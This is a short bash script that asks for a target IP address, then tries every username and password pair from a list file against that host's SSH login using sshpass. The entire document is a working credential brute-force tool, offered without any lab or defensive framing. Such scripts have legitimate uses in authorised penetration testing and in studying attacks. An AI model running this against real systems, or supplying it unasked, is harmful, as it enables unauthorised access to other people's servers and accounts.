#!/bin/bash
read -p "Enter an IP:" ip

while read line; do
    IFS=' ' read -r username password <<<"$line"
    echo "Trying $username with $password for $ip"
    sshpass -p $password ssh -T -l $username $ip
done < username-password-list.txt